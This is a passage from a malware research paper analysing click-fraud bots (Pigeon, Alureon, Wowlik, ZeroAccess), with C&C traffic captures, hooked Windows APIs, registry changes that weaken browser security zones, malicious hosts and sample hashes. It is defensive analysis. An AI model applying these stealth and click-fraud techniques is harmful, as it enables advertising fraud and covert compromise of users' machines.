3|v:3|vc:1|b:820|k:nwvusjhsotjztutijlollwjansnuywwdje|

<span class="bold"><strong>Listing 3: Initial POST request, encrypted with a hard-coded public key.</strong></span>
</pre><p>The C&amp;C server replies with another encrypted message. From now on, encryption is achieved with RC4, and the password is the previously sent parameter, k. </p><pre class="programlisting">0|4addcf9IRcJ1ppO88AlK73c0tD01C9Z7|

<span class="bold"><strong>Listing 4: The first reply from the C&amp;C.</strong></span>
</pre><p>The second POST request to the C&amp;C server is unencrypted and uses only the previously received hash (value 4addcf9IRcJ1ppO88AlK73c0tD01C9Z7) to request an additional payload. The reply to the second POST request is encrypted with RC4. It contains the main module, which is then decrypted, injected into the svchost.exe process, and executed.</p><pre class="programlisting">4|-56389870907|124928|1|2|0|MZ&#144;      &#x2D9;&#x2D9;  &cedil;       @          &#x158;   &#x15F; &acute; &Iacute;!&cedil;L&Iacute;!This program cannot be run in DOS mode.


<span class="bold"><strong>Listing 5: Module downloaded from the C&amp;C server. </strong></span>
</pre><p>Listing 5 shows the newly downloaded module (MZ header) and its size in bytes (124,928). One of the downloaded payloads is the Pigeon clickbot module. We also observed one more module, which was the SOCKS5 proxy. In the case of a proxy payload, the infected system serves as a server which performs clicks requested by client machines.</p></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2880934"></a>4. Comparison of clickbot modules</h2></div></div></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2812486"></a>4.1 Pigeon</h3></div></div></div><p>The Pigeon clickbot is distributed as a DLL file with two exported functions: Start and Stop. When the clicking module is activated, it first needs to hook several system API functions which cause some effects that are noticeable by end-users (e.g. playing sound, displaying message boxes, etc.). The Pigeon clickbot therefore hooks several functions in a few libraries. These functions are shown in <a href="#table.1">Table 1</a>.</p><div class="table"><a id="table.1"></a><table border="1" summary="Hooked functions."><colgroup><col /><col /></colgroup><tbody><tr><td>ws2_32.dll</td><td>GetAddrInfoW, GetAddrInfoExW</td></tr><tr><td>user32.dll</td><td>MessageBoxW, MessageBoxIndirectW, DialogBoxIndirectParamW, DialogBoxParamW</td></tr><tr><td>winmm</td><td>waveOutOpen</td></tr><tr><td>dsound</td><td>DirectSoundCreate</td></tr><tr><td>ole32</td><td>CoCreateInstance, CoGetClassObject</td></tr><tr><td>wininet</td><td>HttpSendRequestA, HttpSendRequestW</td></tr></tbody></table><p class="title"><b>Table&nbsp;1.&nbsp;Hooked functions.</b></p></div><p>Hooking these functions has the effect of a user-mode rootkit. For instance, waveOutOpen silences the waveform-audio output device volume by calling waveOutSetVolume with dwVolume = 0, which means silence. The ole32 functions revoke access to the HKEY_CLASSES_ROOT\CLSID entries belonging to <span class="emphasis"><em>Internet Explorer </em></span>and <span class="emphasis"><em>Video MP4 Moniker Class</em></span> (a plug-in used by<span class="emphasis"><em> Internet Explorer </em></span>to play/stream videos in websites). The wininet functions modify HTTP Accept-Language headers to correspond to the system&rsquo;s locale settings. DirectSoundCreate prevents the creation and initialization of an object that supports the IDirectSound interface. Messages and dialogs using user32.dll APIs are completely bypassed. The Ws2_32 functions modify the host name (pNodeName) parameter. </p><p>Later on, it modifies several keys in the <span class="emphasis"><em>Windows</em></span> registry. These keys influence the behaviour of the web browser window in specific situations. For example, Pigeon sets &lsquo;HKCU\Software\Microsoft\Internet Explorer\Main\NoNewWindows&rsquo; to 1. According to the documentation, setting this entry to 1 blocks the window.open event. A new window becomes an in-place navigation event instead. Setting the value of the &lsquo;Error Dlg Displayed On Every Error&rsquo; registry key to &lsquo;no&rsquo; disables script error notifications. The clickbot also modifies several keys in the Internet settings zones, &lsquo;Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones&rsquo;, namely 1400, 1601 and 1803. In the Internet zone, 1400 enables active scripting, 1601 enables the submitting of non-encrypted form data, and 1803 disables file download. The registry key &lsquo;Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION&rsquo; is set to the value 0x22b8, which forces IE8 standard mode, and the value &lsquo;MAXHTTPREDIRECTS&rsquo; raises the redirection limit of the <span class="emphasis"><em>IE</em></span> browser. </p><p>After all the necessary registry modifications have been made, the clickbot reads a job task. The job task URLs are hard coded in the binary and have the following format:</p><pre class="programlisting">http://&lt;url1&gt;/task/&lt;number&gt;/;http://&lt;url2&gt;/task/&lt;number&gt;/. 
<span class="bold"><strong>
Listing 6: Job task URLs.</strong></span>
</pre><p>The GET request to one of the above-mentioned click job servers returns several lines of plaintext. The first line is the length of the payload, the second line contains the link to be clicked, user agent, etc. The redirection chain from the initial task URL to the actual advertisement link is shown in Listing 7.</p><pre class="programlisting">request:
GET /task/3033/ HTTP/1.1
Accept-Language: cs-CZ
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MATP; MATP; VER#7C#80837569566745484877484849)
Host: rummerstain2.com
reply:
cc
http://find-everything.info/?query=how%20long%20does%20a%20judgement%20stay%20on%20your%20credit%20report|88.198.188.106|8|Mozilla/5.0 
(compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; BOIE9;ENUSMSCOM)
0

<span class="bold"><strong>Listing 7: Redirection chain from initial task URL to the actual advertisement link.</strong></span>
</pre><div class="figure"><a id="figure.7"></a><div class="mediaobject"><img alt="The find-everything.info search engine." src="/uploads/images/figures/2016/01/KalnaiHorejsi-7.jpg" /></div><p class="title"><b>Figure&nbsp;7.&nbsp;The find-everything.info search engine.</b></p></div><p><a href="#figure.7">Figure 7</a> shows the find-everything.info search engine, which is an ad redirection server. Querying this server gives another payload pointing to the ad control server. Notice that the user agent string is the same as the string obtained in the task command.</p><pre class="programlisting">request:
GET /?query=how%20long%20does%20a%20judgement%20stay%20on%20your%20credit%20report HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; BOIE9;ENUSMSCOM)
Host: find-everything.info
reply:
c2
&lt;body&gt;&lt;a id=&rdquo;lnk&rdquo; href=&rdquo;http://88.214.241.192/click?sid=403f00deeffc1d7fdd41b7d3f33695e79a210a39&amp;cid=1&rdquo;&gt;&lt;/a&gt;&lt;/body&gt;&lt;script type=&rdquo;text/javascript&rdquo;&gt;document.getElementById(&ldquo;lnk&rdquo;).click();&lt;/script&gt;
0<span class="bold"><strong>

Listing 8: Querying the find-everything.info server.</strong></span>
</pre><p>Clicking to the supplied link with a proper referer and user agent causes the HTTP redirection to the ad server itself (Listing 9).</p><pre class="programlisting">request:
GET /click?sid=403f00deeffc1d7fdd41b7d3f33695e79a210a39&amp;cid=1 HTTP/1.1
Referer: http://find-everything.info/?query=how%20long%20does%20a%20judgement%20stay%20on%20your%20credit%20report
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; BOIE9;ENUSMSCOM)
Host: 88.214.241.192
reply:
In reply, HTTP Location header then causes one more redirection to 
Location: http://delivery.seroads.com/display?p=11095&amp;ad=...4
<span class="bold"><strong>
Listing 9: HTTP redirection to the ad server.</strong></span>
</pre><p>One more redirection follows, as shown in Listing 10.</p><pre class="programlisting">request:
GET /display?p=11095&amp;ad=Y...4 HTTP/1.1
Referer: http://find-everything.info/?query=how%20long%20does%20a%20judgement%20stay%20on%20your%20credit%20report
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; BOIE9;ENUSMSCOM)
Cookie: CLICK=CLICK_16
Host: delivery.seroads.com
reply:
HTTP/1.1 302 Found
Location: http://bakingforlife.tv/r-bakingforlife.html?lp=1&amp;externalID=S-CTM-BFL-US1&amp;subExternalID=sero_11095-22-2
<span class="bold"><strong>
Listing 10: Final redirection.</strong></span>
</pre><p>The contents of the Location HTTP header show the final destination, with parameters identifying the source of the ad network. </p><p>An <span class="emphasis"><em>Internet Explorer </em></span>window is then started in embedding mode. An invisible browser window is a COM object with CLSID=8856f961-340a-11d0-a96b-00c04fd705a2 (Shell.Explorer.2). This window then navigates to the URL obtained from the task server. To behave more realistically and to simulate human behaviour more accurately, a user simulation thread is spawned. This thread randomly moves the mouse, sets the cursor or clicks. One of the web pages that Pigeon redirects to in its hidden window is shown in Listing 10. </p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4341670"></a>4.2 Alureon </h3></div></div></div><p>The Alureon module is very similar to the Pigeon module. The Alureon module does not have Start and Stop exports. It also checks command-line parameters to make sure it is running inside the &lsquo;svchost.exe -netsvcs&rsquo; process. </p><p>The format of the task URLs are the same (only the URL addresses and task numbers are different), and the incoming reply also has the same format. Alureon&rsquo;s browser window and user simulation thread are programmed in the same way as Pigeon&rsquo;s. The Alureon clicker modifies some registry keys at startup, but not the same ones. The Alureon clicker, in addition, contains many calls to the WritePrivateProfileStringA and GetPrivateProfileStringA functions, which read or update configuration information stored in the corresponding ini files. The Alureon and Pigeon modules share a significant portion of code, and were probably coded by the same programmer(s). </p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2851945"></a>4.3 Wowlik </h3></div></div></div><p>The Wowlik clickbot module (named module_clk1.20) has a different structure from the previously described modules. It hooks even more APIs than Pigeon and Alureon. In addition to those hooked by Pigeon, it hooks the functions listed in <a href="#table.2">Table 2</a>.</p><div class="table"><a id="table.2"></a><table border="1" summary="Additional hooked functions."><colgroup><col /><col /></colgroup><tbody><tr><td>kernel32.dll </td><td>CreateProcessInternalW, SetUnhandledExceptionFilter, GetModuleFileNameW</td></tr><tr><td>user32.dll</td><td>GetCursorPos</td></tr><tr><td>ntdll.dll</td><td>ZwOpenKey, ZwOpenKeyEx, LdrLoadDll, LdrGetProcedureAddressEx, LdrGetProcedureAddress</td></tr><tr><td>shell32.dll</td><td>SHGetFolderPathW</td></tr></tbody></table><p class="title"><b>Table&nbsp;2.&nbsp;Additional hooked functions.</b></p></div><p>Hooking the functions implements a user-mode rootkit. Hooking ntdll functions blocks access to HKEY_CLASSES_ROOT\CLSID entries belonging to <span class="emphasis"><em>Internet Explorer </em></span>and the audio core API. Hooking SHGetFolderPathW blocks access to the browser history directory and browser cookies directory. GetAddrInfo replaces the searcher URL with a localhost URL when queried for information. </p><p>It then randomly chooses one of the hard-coded searchers and one of many hard-coded keywords. For example, the searcher name takes the format: &lsquo;http://&lt;US state name&gt;-searcher.com/?q ={keyword}&rsquo;, and for the keyword something like &lsquo;low+cost+car+insurance&rsquo; might be selected (see <a href="#figure.8">Figure 8</a>). In the analysed sample, we had just three searchers and about 550 keywords. </p><div class="figure"><a id="figure.8"></a><div class="mediaobject"><img alt="Wowlink randomly chooses one of the hard-coded searchers and one of many hard-coded keywords." src="/uploads/images/figures/2016/01/KalnaiHorejsi-8.jpg" /></div><p class="title"><b>Figure&nbsp;8.&nbsp;Wowlink randomly chooses one of the hard-coded searchers and one of many hard-coded keywords. </b></p></div><p>Now it is time to get advertisements to click. This is done by querying the ad links from a link feeder, which is hard coded in the clicker module. The format of the request to the feeder is shown in Listing 11.</p><pre class="programlisting">http://95.211.231.195/feed?version={version}&amp;sid={aid}&amp;q={keyword}&amp;ref={ref}&amp;ua={ua}&amp;lang={lang}

<span class="bold"><strong>Listing 11. Request to link feeder.</strong></span>
</pre><p>Here, &lsquo;version&rsquo; is the software version; &lsquo;aid&rsquo; is an affiliate ID (taken from the variable &lsquo;aid&rsquo; in the configuration file wow.ini); &lsquo;keyword&rsquo; is a randomly chosen string; &lsquo;ref&rsquo; is a referer formed by the a concatenation of the searcher string and the keyword string; &lsquo;ua&rsquo; is a user agent string; and &lsquo;lang&rsquo; is language. The reply from the feeder (shown in Listing 12) contains various information &ndash; the clickurl parameter is the most relevant for revenue generation.</p><pre class="programlisting">reply:
&lt;result status=&rdquo;OK&rdquo; records=&rdquo;2&rdquo; searchRequest=&rdquo;inner knee pain&rdquo; processTime=&rdquo;0.0732&rdquo;&gt;
&lt;record&gt;
&lt;title&gt;&lt;![CDATA[Get The Latest Celebrity and Relationship News @ Cupid&rsquo;s Pulse!]]&gt;&lt;/title&gt;
&lt;description&gt;&lt;![CDATA[Launched in November 2010, CupidsPulse.com is a one-of-a-kind relationship site that analyses trending celebrity news to provide relatable love advice for singles and couples.]]&gt;&lt;/description&gt;
&lt;url&gt;&lt;![CDATA[http://www.cupidspulse.com/]]&gt;&lt;/url&gt;
&lt;clickurl&gt;&lt;![CDATA[http://46.165.240.227/r/8m8739v3/cfa9eaf4f02606798528293d9bc8dfe4/AA/0]]&gt;&lt;/clickurl&gt;
  &lt;bid&gt;0.0035&lt;/bid&gt;
    &lt;tag&gt;6921:114625:&lt;/tag&gt;
  &lt;/record&gt;
  &lt;record&gt;

...
  &lt;/record&gt;

&lt;/result&gt;

<span class="bold"><strong>Listing 12: Reply from the feeder.</strong></span>
</pre><p>Getting the URL for clicking (GET /r/8m8739v3/0ce110ef35bfe90f53b583174a24963c/AA/0) causes redi-rection via the HTTP Location header.</p><pre class="programlisting">Location: http://www.cupidspulse.com/?utm_source=clickpayz&amp;utm_medium=CPC&amp;utm_campaign=u_28490

request:
GET /?utm_source=clickpayz&amp;utm_medium=CPC&amp;utm_campaign=u_28490 HTTP/1.1
Referer: http://arkansas-searcher.com/?q=best+foods+for+weight+loss
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
Host: www.cupidspulse.com

<span class="bold"><strong>Listing 13: Redirection via the HTTP Location header.</strong></span>
</pre><p>This is the final redirection we were looking for. The Urchin Tracking Module (utm) mentioned in the redirection request is the format used by <span class="emphasis"><em>Google</em></span> to track unique URLs. So, basically, at the end of this redirection chain, the cupidspulse.com website thinks that someone clicked on a link at arkansas-searcher.com (referer), and was redirected to it. The owners of the cupidspulse.com may therefore believe it has more visitors than it really has. A browser window is again created as a hidden COM object.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4378462"></a>4.4 ZeroAccess/Sirefef </h3></div></div></div><p>The ZeroAccess clickbot is one of the most prolific and most heavily analysed clickbots, so we will reference one of its previous analyses [<span class="citation"><a href="#citation.10">10</a></span>]. Similarly to the other modules, it blocks access to several registry keys and hooks a few APIs related to the sound device. The ZeroAccess fraudulent click module first parses the raw data received from the task server, which consists of a set of referer URLs, each with one or more accompanying ad URLs. Task data is then parsed into referer/ad structures. The structures are then sorted and fraudulent clicks are performed. </p><p>Several redirections are made before reaching the ad server. The clickbot client is redirected first to an ad redirection server, secondly to an ad control server, and finally to the ad server itself. </p><p>Unlike other clickbots, ZeroAccess does not use threads to simulate user behaviour. The interfaces IHTMLDocument2, IMoniker and IBindCtx are used to perform an ad redirection chain instead. </p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3492647"></a>4.5 Summary</h3></div></div></div><p><a href="#table.3">Table 3</a> shows a comparison of the clickbot modules. Even though the droppers of Pigeon and Alureon largely differ, the minimalistic clickbot payloads are similar in most features. The ZeroAccess trojan enjoys the greatest complexity and imitates a real user the most accurately. The Wowlik clickbot lies somewhere in between. </p><div class="table"><a id="table.3"></a><table border="1" summary="Comparison of clickbot modules."><colgroup><col /><col /><col /><col /><col /></colgroup><thead><tr><th align="center">&nbsp;</th><th align="center">Pigeon</th><th align="center">Alureon</th><th align="center">Wowlik</th><th align="center">ZeroAccess </th></tr></thead><tbody><tr><td>Compiler</td><td>Visual C++ 9.0, custom </td><td>Visual C++ 9.0, custom</td><td>Custom</td><td>Custom</td></tr><tr><td>32-bit &amp; 64-bit</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td></tr><tr><td>Config file</td><td>-</td><td>&lt;random name&gt;</td><td>wow.ini</td><td>@</td></tr><tr><td>Inner name of DLL (exports)</td><td>___ (Start, Stop)</td><td>-</td><td>um, um64 (StubLoadDll)</td><td><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3e060e0e0e0e0e0d0c107e">[email&#160;protected]</a>, 80000064.64</td></tr><tr><td>Level of real user simulation</td><td>+</td><td>+</td><td>++</td><td>+++</td></tr><tr><td>Reconfiguration of Security Zones</td><td>Yes</td><td>Yes</td><td>Yes in newer versions</td><td>No</td></tr><tr><td>Injected into process</td><td>svchost.exe</td><td>svchost.exe</td><td>dllhost.exe</td><td>svchost.exe</td></tr><tr><td>Searchers &amp; keywords</td><td>Downloaded</td><td>Downloaded</td><td>Hard coded</td><td>Downloaded</td></tr></tbody></table><p class="title"><b>Table&nbsp;3.&nbsp;Comparison of clickbot modules.</b></p></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3240514"></a>5. Conclusion</h2></div></div></div><p>The Blackbeard/Pigeon clickbot follows the path that was previously set by ZeroAccess. It uses a sophisticated method to stay persistent in a victim&rsquo;s computer. Analysing this kind of threat is not a straightforward task, because the entire process is divided into several stages, running in several different processes and requiring different resources and permissions. Therefore it could be said that the overall complexity of programs performing click fraud often overcomes the sophistication of common banking trojans. The only slight advantage for a victim is the fact that the financial damage is indirect &ndash; decreased performance and disruption to the system usage. However, click fraud negatively affects the whole online advertising environment, especially advertisers who pay for ineffective traffic.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4909161"></a>Acknowledgement</h2></div></div></div><p>We would like to thank Jindrich Kubec for his advice and information on the malware distribution chain.</p><div class="bibliography"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3726976"></a>Bibliography</h3></div></div></div><div class="bibliomixed"><a id="citation.1"></a><p class="bibliomixed">[1] Salmela, K. An unknown exploit kit with a far reach.<span class="bibliosource"><a href="https://coffeeshopsecurity.blogspot.cz/2013/10/an-unknown-exploit-kit-with-far-reach.html" target="_blank">http://coffeeshopsecurity.blogspot.cz/2013/10/an-unknown-exploit-kit-with-far-reach.html</a></span>.</p></div><div class="bibliomixed"><a id="citation.2"></a><p class="bibliomixed">[2] Guy, J. Case Study: Click Fraud Malware Using NOTEPAD.EXE as a Cover. <span class="bibliosource"><a href="http://www.carbonblack.com/case-study-click-fraud-malware-using-notepad-exe-as-a-cover-2/" target="_blank">http://www.carbonblack.com/case-study-click-fraud-malware-using-notepad-exe-as-a-cover-2/</a></span>. </p></div><div class="bibliomixed"><a id="citation.3"></a><p class="bibliomixed">[3] K&aacute;lnai, P. Win32/64:Blackbeard &amp; Pigeon: Stealthiness techniques in 64-bit Windows, Part 1. <span class="bibliosource"><a href="https://blog.avast.com/2014/01/15/win3264blackbeard-pigeon-stealthiness-techniques-in-64-bit-windows-part-1/" target="_blank">http://blog.avast.com/2014/01/15/win3264blackbeard-pigeon-stealthiness-techniques-in-64-bit-windows-part-1/</a></span>.</p></div><div class="bibliomixed"><a id="citation.4"></a><p class="bibliomixed">[4] Lempel-Ziv-Oberhumer data compression algorithm (LZO). <span class="bibliosource"><a href="https://en.wikipedia.org/wiki/Lempel&ndash;Ziv&ndash;Oberhumer" target="_blank">http://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Oberhumer</a></span>.</p></div><div class="bibliomixed"><a id="citation.5"></a><p class="bibliomixed">[5] Reading memory of x64 process from x86 process. <span class="bibliosource"><a href="http://blog.rewolf.pl/blog/?p=319" target="_blank">http://blog.rewolf.pl/blog/?p=319</a></span>.</p></div><div class="bibliomixed"><a id="citation.6"></a><p class="bibliomixed">[6] List of Windows 7 (beta build 7000) auto-elevated binaries. <span class="bibliosource"><a href="http://withinwindows.com/2009/02/05/list-of-windows-7-beta-build-7000-auto-elevated-binaries/" target="_blank">http://withinwindows.com/2009/02/05/list-of-windows-7-beta-build-7000-auto-elevated-binaries/</a></span>.</p></div><div class="bibliomixed"><a id="citation.7"></a><p class="bibliomixed">[7] Windows 7 UAC whitelist: Proof-of-concept source code. <span class="bibliosource"><a href="http://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.html" target="_blank">http://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.html</a></span>.</p></div><div class="bibliomixed"><a id="citation.8"></a><p class="bibliomixed">[8] CVE-2013-3660. <span class="bibliosource"><a href="https://www.exploit-db.com/exploits/25611" target="_blank">http://www.exploit-db.com/exploits/25611</a></span>.</p></div><div class="bibliomixed"><a id="citation.9"></a><p class="bibliomixed">[9] Windows File Protection. <span class="bibliosource"><a href="https://bitsum.com/aboutwfp.asp" target="_blank">http://bitsum.com/aboutwfp.asp</a></span>. </p></div><div class="bibliomixed"><a id="citation.10"></a><p class="bibliomixed">[10] Low, W. A deeper look into the ZeroAccess clickbot. Virus Bulletin, April 2013. <span class="bibliosource"><a href="/virusbulletin/2013/04/deeper-look-zeroaccess-clickbot
" target="_top">https://www.virusbtn.com/virusbulletin/archive/2013/04/vb201304-ZeroAccess</a></span>.</p></div><div class="bibliomixed"><a id="citation.11"></a><p class="bibliomixed">[11] Horej&scaron;&iacute; , J. Win32/64:Blackbeard &amp; Pigeon: Stealthiness techniques in 64-bit Windows, Part 2. <span class="bibliosource"><a href="https://blog.avast.com/2014/01/22/win3264blackbeard-pigeon-stealthiness-techniques-in-64-bit-windows-part-2/" target="_blank">http://blog.avast.com/2014/01/22/win3264blackbeard-pigeon-stealthiness-techniques-in-64-bit-windows-part-2/</a></span>.</p></div><div class="bibliomixed"><a id="citation.12"></a><p class="bibliomixed">[12] Stop Malvertising, Analysis of a Triple Click Fraud Threat. <span class="bibliosource"><a href="http://stopmalvertising.com/rootkits/analysis-of-a-triple-click-fraud-threat.html" target="_blank">http://stopmalvertising.com/rootkits/analysis-of-a-triple-click-fraud-threat.html</a></span>.</p></div><div class="bibliomixed"><a id="citation.13"></a><p class="bibliomixed">[13] Lelli, A. Sophisticated Viknok Malware proves click fraud still money maker scammers. Symantec blog, May 2014. <span class="bibliosource"><a href="https://www.symantec.com/connect/blogs/sophisticated-viknok-malware-proves-click-fraud-still-moneymaker-scammers" target="_blank">http://www.symantec.com/connect/blogs/sophisticated-viknok-malware-proves-click-fraud-still-moneymaker-scammers</a></span>.</p></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4114657"></a>Appendix: Samples</h2></div></div></div><div class="informaltable"><table border="1"><colgroup><col /><col /></colgroup><tbody><tr><td>Blackbeard custom packed</td><td>CD423CEF022CBA16EED76F5424B9FA099F2FAAA5238A52187F215BF8C05D1A5F</td></tr><tr><td>Blackbeard drive-by download</td><td>CAD3619A0736BDE5FB7ABCC405FE97C216F240CD21685B74ED5DDDFEC58BD513</td></tr><tr><td>Infected 32-bit rpcss.dll</td><td>5BB36D5C17B193844CAC6E143E8940317519C478D7AC595CFC80C8C49F0A1541</td></tr><tr><td>Infected 64-bit rpcss.dll</td><td>C668A80700DA4578D0A8F03B24C6516DD7D14CE88CEA73FCA47BA08B431859E0</td></tr><tr><td>Patched randomly chosen and copied 64-bit dll library</td><td>C493D1F3E1AEC5E6B31E34CB2A68B76A8EA7C8204037D30150A70A243D45D1F1</td></tr><tr><td>Blackbeard downloader (Feb 2012)</td><td>D09242AC19497C2CCCE5B493D41CC3F60E3440F7B18516D37F61336326141BF4</td></tr><tr><td>Blackbeard downloader (Nov 2013)</td><td>3B2DBA499FC805C363F91940FDAC01D376F7F93F958CADC249F456DD239C78C2</td></tr><tr><td>Blackbeard/Pigeon (April 2014)</td><td>8A5441B6D9A183CD281C7E7AAE933A75DF907F5A2D771317984342596C467E0E</td></tr><tr><td>Pigeon clickbot 32-bit</td><td>33CF9FC1CEE508B69FD931CEA7D3B178F70303B86DE6DEB67F45FEB610E52733</td></tr><tr><td>Pigeon clickbot 64-bit</td><td>EC14BB034EB2327F841A8E4AE2DEB2766B02D5459116026907806D04FD84F6EA</td></tr><tr><td>Alureon clickbot 32-bit</td><td>D213C2405ECA561C601050BFF0514FBC7FDF64F7B61F20093E43D4CD47F40DBB</td></tr><tr><td>Alureon clickbot 64-bit</td><td>AFABC8335F6852FE6DC6DBD8FAEB7B18AB2E77E02A56E2465B00F58D4B560449</td></tr><tr><td>Wowlik clickbot 32-bit v1.2</td><td>D2AA674AD52310CEC6F4320AA9D340B0279ED896A7245D6A07500B90859374E8</td></tr><tr><td>Wowlik clickbot 32-bit v1.5</td><td>10C647F3DEB73D39DD44AF79F3B81BB8D5B84491CE06805FA17027108FC88B7F</td></tr><tr><td>Wowlik clickbot 64-bit &gt;= v2.2</td><td>594247F752772CA316920F4AAC14A76CC0F136A0D4BE4B740BC1282651240506</td></tr><tr><td>Sirefef clickbot 32-bit</td><td>982F5F47761F9E686FD6635F43AC045426FD3933F05D32030AC65280B3817AC2</td></tr><tr><td>Sirefef clickbot 64-bit</td><td>890DDC3E75B36F5AFDACD7394BC2A391F92504A3FE64C3714F877A5E7C0724F9</td></tr></tbody></table></div></div> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<p><a href="/uploads/pdf/conference/vb2014/VB2014-KalnaiHorejsi.pdf" target="_blank"><img class="ccm-image-block responsive" alt="" src="/uploads/images/buttons/pdf-download-button.jpg" onmouseover="this.src = '/uploads/images/buttons/pdf-download-button-hover.jpg'" onmouseout="this.src = '/uploads/images/buttons/pdf-download-button.jpg'" border="0" height="45" width="262"></a></p>
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=VB2014 paper: Notes on click fraud: American story&url=https://www.virusbulletin.com/virusbulletin/2016/01/paper-notes-click-fraud-american-story"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2016/01/paper-notes-click-fraud-american-story'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2016/01/paper-notes-click-fraud-american-story&title=VB2014 paper: Notes on click fraud: American story"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2016/01/paper-notes-click-fraud-american-story&t=VB2014 paper: Notes on click fraud: American story"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2016/01/paper-notes-click-fraud-american-story"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p> </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
